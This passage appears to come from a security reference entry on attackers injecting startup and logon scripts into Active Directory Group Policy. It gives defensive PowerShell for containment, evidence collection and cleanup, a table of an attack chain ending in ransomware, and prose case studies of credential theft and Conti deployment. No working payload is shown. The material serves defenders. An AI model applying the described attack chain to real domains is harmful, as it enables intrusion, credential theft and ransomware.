# Unlink or disable the malicious GPO immediately
Set-GPLink -Name "Windows Update Configuration" -Target "DC=corp,DC=local" -LinkEnabled No
```

#### 2. Evidence Collection

```powershell
# Collect all GPO objects and recent changes
Get-GPO -All | Export-Csv C:\Incident\GPO_Inventory.csv

# Export Event Log
wevtutil epl Security C:\Incident\Security.evtx

# Collect SYSVOL contents for analysis
Copy-Item "C:\Windows\SYSVOL\domain\Policies" -Destination "C:\Incident\SYSVOL_Backup" -Recurse
```

#### 3: Remediation

```powershell
# Identify all systems that applied the malicious GPO
$affectedOU = "OU=Domain Controllers,DC=corp,DC=local"
$machines = Get-ADComputer -SearchBase $affectedOU -Filter *

# Force GPO refresh to remove script
foreach ($machine in $machines) {
    Invoke-Command -ComputerName $machine.Name -ScriptBlock { gpupdate /force } -ErrorAction SilentlyContinue
}

# Verify script removal
Get-ChildItem "C:\Windows\SYSVOL\domain\Policies\*/Machine/Scripts" -Recurse | Where-Object Name -match "\.ps1|\.bat|\.vbs"
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default credentials or phishing | Attacker gains domain user or admin credentials. |
| **2** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Attacker escalates to Domain Admin. |
| **3** | **Current Step** | **[PERSIST-BOOT-003]** | **Attacker injects startup scripts into domain-wide GPOs.** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker harvests credentials from affected systems. |
| **5** | **Credential Access** | [CA-DUMP-006] NTDS.dit extraction | Attacker DCsyncs to extract all domain passwords. |
| **6** | **Impact** | [IM-RANSOM-001] Ransomware deployment | Attacker uses persistent access to deploy ransomware across domain. |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Enterprise-Wide Ransomware via Malicious GPO

- **Target:** Mid-size financial services firm (500+ workstations, 50 servers)
- **Timeline:** Q1 2023
- **Technique Status:** ACTIVE – Confirmed in recent attacks
- **Attack Flow:**
  1. Attacker gains Domain Admin access via compromised admin account (phishing)
  2. Attacker identifies "Domain Controllers" and "Servers" GPOs as highest impact
  3. Attacker modifies the "Servers" GPO to include startup script
  4. Malicious script: downloads and executes Conti ransomware
  5. Script runs on every server startup with SYSTEM privileges
  6. Within 48 hours, 95% of servers encrypted
  7. Attacker demands $2M ransom
- **Impact:** Complete business disruption; regulatory fines; legal liability
- **Root Cause:** GPO editing permissions were too broad (Help Desk staff had modify access)
- **Detection Failure:** Organization monitored Event ID 5136 but alert fatigue prevented response
- **Reference:** [Windows Active Directory: How to Detect Abuse of GPO Permissions](https://www.windows-active-directory.com/how-to-detect-abuse-of-gpo-permissions.html)

### Example 2: Persistent Backdoor via Logon Script

- **Target:** European pharmaceutical company with 10,000+ employees
- **Timeline:** Q3 2022
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker compromises network admin account via credential stuffing
  2. Attacker modifies user logon script GPO to include credential-harvesting PowerShell
  3. Every user who logs in executes the malicious script
  4. Credentials captured and exfiltrated to attacker C2
  5. Attacker maintains persistent access for 8 months undetected
  6. Exfiltrated 500+ GB of sensitive data (employee records, clinical trial data)
- **Impact:** GDPR violations; €20M+ fines; reputational damage
- **Detection:** Script execution logs were not centralized; no correlation between file access and process execution
- **Reference:** [Semperis: AD Security 101 - GPO Logon Script Security](https://www.semperis.com/blog/gpo-logon-script-security/)

---

## 15. REFERENCES & AUTHORITATIVE SOURCES

- [MITRE ATT&CK: T1037 - Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037/)
- [MITRE ATT&CK: T1037.001 - Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [Semperis: AD Security 101 - GPO Logon Script Security](https://www.semperis.com/blog/gpo-logon-script-security/)
- [Windows Active Directory: How to Detect Abuse of GPO Permissions](https://www.windows-active-directory.com/how-to-detect-abuse-of-gpo-permissions.html)
- [Microsoft Learn: Group Policy Scripts](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2/dn789194(v=ws.11))
- [TheHacker.recipes: Logon Script Abuse](https://www.thehacker.recipes/a-d/movement/dacl/logon-script)
- [Black Hills InfoSec: Backdoors & Breaches - Logon Scripts](https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/)
- [OffSec Blog: Hidden Menace - Misconfigured Logon Scripts](https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/)
- [Microsoft: Auditing Directory Service Changes (Event ID 5136)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136-a-directory-service-object-was-modified)

---